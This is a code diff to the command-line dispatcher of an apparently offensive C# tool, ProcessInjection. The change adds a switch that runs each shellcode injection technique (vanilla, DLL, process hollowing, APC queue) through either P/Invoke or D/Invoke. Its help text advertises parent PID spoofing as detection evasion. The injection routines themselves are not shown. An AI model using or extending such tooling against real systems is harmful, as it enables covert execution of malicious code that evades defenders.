@@ -1,18 +1,10 @@
 using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
-using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Diagnostics;
-using System.Threading;
-using System.IO;
 using System.Security.Cryptography;
-using System.Net;
-using static ProcessInjection.Native.Win32API;
-using static ProcessInjection.Native.Enums;
 using static ProcessInjection.Native.Structs;
-using static ProcessInjection.Native.Constants;
 using static ProcessInjection.Utils.Utils;
 using static ProcessInjection.Utils.Crypto;
 using ProcessInjection.Native;
@@ -21,12 +13,12 @@ using static ProcessInjection.PInvoke.DLLInjection;
 using static ProcessInjection.PInvoke.ProcessHollowing;
 using static ProcessInjection.PInvoke.APCQueue;
 using ProcessInjection.PInvoke;
-using static ProcessInjection.DInvoke.CreateRemoteThread;
+
 
 namespace ProcessInjection
 {
     public class ProcessInjection
-    {       
+    {
 
         public static void logo()
         {
@@ -54,7 +46,10 @@ namespace ProcessInjection
     2) DLL Injection
     3) Process Hollowing
     4) APC Queue Injection
-    5) Dynamic Invoke - CreateRemoteThread Injection
+
+[+] The tool 2 methods of calling the Win32APIs.
+    1) P/Invoke
+    2) D/Invoke
 
 [+] Supports 3 detection evading techniques.
     1) Parent PID Spoofing
@@ -77,7 +72,9 @@ Usage           Description
                 2 = DLL Injection
                 3 = Process Hollowing
                 4 = APC Queue Injection
-                5 = Dynamic Invoke - CreateRemoteThread Injection
+/m              Specify the method to be used
+                p = P/Invoke (Default)
+                d = D/Invoke
 /f              Specify the format of the shellcode.
                 base64
                 hex
@@ -191,9 +188,9 @@ Usage           Description
                             }
                         }
                     }
-                    else if(arguments.ContainsKey("/sc"))
+                    else if (arguments.ContainsKey("/sc"))
                     {
-                        if(arguments["/f"]== "base64" || arguments["/f"]=="hex")
+                        if (arguments["/f"] == "base64" || arguments["/f"] == "hex")
                         {
                             shellcode = arguments["/sc"];
                         }
@@ -277,8 +274,16 @@ Usage           Description
                             {
                                 if (arguments.ContainsKey("/ppath"))
                                 {
-                                    PrintTitle($"[>>] Parent Process Spoofing with Vanilla Process Injection Technique.");
-                                    PPIDCodeInject(arguments["/ppath"], buf, parentProc);
+                                    if (arguments.ContainsKey("/m") && arguments["/m"] == "d")
+                                    {
+                                        PrintTitle($"[>>] Dynamic Invoke - Parent Process Spoofing with Vanilla Process Injection Technique.");
+                                        DInvoke.CreateRemoteThread.PPIDDynCodeInject(arguments["/ppath"], buf, parentProc);
+                                    }
+                                    else
+                                    {
+                                        PrintTitle($"[>>] Parent Process Spoofing with Vanilla Process Injection Technique.");
+                                        PPIDCodeInject(arguments["/ppath"], buf, parentProc);
+                                    }
                                 }
                                 else
                                 {
@@ -287,8 +292,16 @@ Usage           Description
                             }
                             else
                             {
-                                PrintTitle($"[>>] Vanilla Process Injection Technique.");
-                                CodeInject(procid, buf);
+                                if (arguments.ContainsKey("/m") && arguments["/m"] == "d")
+                                {
+                                    PrintTitle($"[>>] Dynamic Invoke - Vanilla Process Injection Technique.");
+                                    DInvoke.CreateRemoteThread.DynamicCodeInject(procid, buf);
+                                }
+                                else
+                                {
+                                    PrintTitle($"[>>] Vanilla Process Injection Technique.");
+                                    CodeInject(procid, buf);
+                                }
                             }
                         }
                         else if (arguments["/t"] == "3")
@@ -297,15 +310,33 @@ Usage           Description
                             {
                                 if (arguments.ContainsKey("/parentproc"))
                                 {
-                                    PrintTitle($"[>>] Parent Process Spoofing with Process Hollowing Technique.");
-                                    ProcessHollowing prochollow = new ProcessHollowing();
-                                    prochollow.PPIDPProcHollow(arguments["/ppath"], buf, parentProc);
+                                    if (arguments.ContainsKey("/m") && arguments["/m"] == "d")
+                                    {
+                                        PrintTitle($"[>>] Parent Process Spoofing with Dynamic Invoke Process Hollowing Technique.");
+                                        DInvoke.DynamicProcessHollowing prochollow = new DInvoke.DynamicProcessHollowing();
+                                        prochollow.PPIDDynProcHollow(arguments["/ppath"], buf, parentProc);
+                                    }
+                                    else
+                                    {
+                                        PrintTitle($"[>>] Parent Process Spoofing with Process Hollowing Technique.");
+                                        ProcessHollowing prochollow = new ProcessHollowing();
+                                        prochollow.PPIDProcHollow(arguments["/ppath"], buf, parentProc);
+                                    }
                                 }
                                 else
                                 {
-                                    PrintTitle($"[>>] Process Hollowing Injection Technique.");
-                                    ProcessHollowing prochollow = new ProcessHollowing();
-                                    prochollow.ProcHollow(arguments["/ppath"], buf);
+                                    if (arguments.ContainsKey("/m") && arguments["/m"] == "d")
+                                    {
+                                        PrintTitle($"[>>] Dynamic Invoke - Process Hollowing Injection Technique.");
+                                        DInvoke.DynamicProcessHollowing prochollow = new DInvoke.DynamicProcessHollowing();
+                                        prochollow.DynamicProcHollow(arguments["/ppath"], buf);
+                                    }
+                                    else
+                                    {
+                                        PrintTitle($"[>>] Process Hollowing Injection Technique.");
+                                        ProcessHollowing prochollow = new ProcessHollowing();
+                                        prochollow.ProcHollow(arguments["/ppath"], buf);
+                                    }
                                 }
                             }
                             else
@@ -319,39 +350,37 @@ Usage           Description
                             {
                                 if (arguments.ContainsKey("/parentproc"))
                                 {
-                                    PrintTitle($"[>>] Parent Process Spoofing with APC Queue Injection Technique.");
-                                    PPIDAPCInject(arguments["/ppath"], buf, parentProc);
+                                    if (arguments.ContainsKey("/m") && arguments["/m"] == "d")
+                                    {
+                                        PrintTitle($"[>>] Parent Process Spoofing with Dynamic Invoke APC Queue Injection Technique.");
+                                        DInvoke.APCQueue.PPIDDynAPCInject(arguments["/ppath"], buf, parentProc);
+                                    }
+                                    else
+                                    {
+
+                                        PrintTitle($"[>>] Parent Process Spoofing with APC Queue Injection Technique.");
+                                        PPIDAPCInject(arguments["/ppath"], buf, parentProc);
+                                    }
                                 }
                                 else
                                 {
-                                    PrintTitle($"[>>] APC Queue Injection Technique.");
-                                    PROCESS_INFORMATION processInfo = StartProcess(arguments["/ppath"]);
-                                    APCInject(processInfo.dwProcessId, processInfo.dwThreadId, buf);
+                                    if (arguments.ContainsKey("/m") && arguments["/m"] == "d")
+                                    {
+                                        PrintTitle($"[>>] Dynamic Invoke - APC Queue Injection Technique.");
+                                        DInvoke.Native.Structs.PROCESS_INFORMATION processInfo = DInvoke.APCQueue.StartProcess(arguments["/ppath"]);
+                                        DInvoke.APCQueue.DynamicAPCInject(processInfo.dwProcessId, processInfo.dwThreadId, buf);
+                                    }
+                                    else
+                                    {
+                                        PrintTitle($"[>>] APC Queue Injection Technique.");
+                                        PROCESS_INFORMATION processInfo = PInvoke.ProcessHollowing.StartProcess(arguments["/ppath"]);
+                                        APCInject(processInfo.dwProcessId, processInfo.dwThreadId, buf);
+                                    }
                                 }
                             }
                             else
                             {
                                 PrintError("[-] /ppath argument is missing");
-                            }
-                        }
-                        else if (arguments["/t"] == "5")
-                        {
-                            if (arguments.ContainsKey("/parentproc"))
-                            {
-                                if (arguments.ContainsKey("/ppath"))
-                                {
-                                    PrintTitle($"[>>] Dynamic Invoke - Parent Process Spoofing with Vanilla Process Injection Technique.");
-                                    PPIDDynCodeInject(arguments["/ppath"], buf, parentProc);
-                                }
-                                else
-                                {
-                                    PrintError("[-] /ppath argument is missing");
-                                }
-                            }
-                            else
-                            {
-                                PrintTitle($"[>>] Dynamic Invoke - Vanilla Process Injection Technique.");
-                                DynamicCodeInject(procid, buf);
                             }
                         }
                     }
@@ -361,8 +390,16 @@ Usage           Description
                         {
                             if (arguments.ContainsKey("/ppath"))
                             {
-                                PrintTitle($"[>>] Parent Process Spoofing with DLL Injection Technique.");
-                                PPIDDLLInject(arguments["/ppath"], dllbuf, parentProc);
+                                if (arguments.ContainsKey("/m") && arguments["/m"] == "d")
+                                {
+                                    PrintTitle($"[>>] Parent Process Spoofing with Dynamic Invoke DLL Injection Technique.");
+                                    DInvoke.DLLInjection.PPIDDynDLLInject(arguments["/ppath"], dllbuf, parentProc);
+                                }
+                                else
+                                {
+                                    PrintTitle($"[>>] Parent Process Spoofing with DLL Injection Technique.");
+                                    PPIDDLLInject(arguments["/ppath"], dllbuf, parentProc);
+                                }
                             }
                             else
                             {
@@ -371,8 +408,16 @@ Usage           Description
                         }
                         else
                         {
-                            PrintTitle($"[>>] DLL Injection Technique.");
-                            DLLInject(procid, dllbuf);
+                            if (arguments.ContainsKey("/m") && arguments["/m"] == "d")
+                            {
+                                PrintTitle($"[>>] Dynamic Invoke - DLL Injection Technique.");
+                                DInvoke.DLLInjection.DynamicDLLInject(procid, dllbuf);
+                            }
+                            else
+                            {
+                                PrintTitle($"[>>] DLL Injection Technique.");
+                                DLLInject(procid, dllbuf);
+                            }
                         }
                     }
                     else
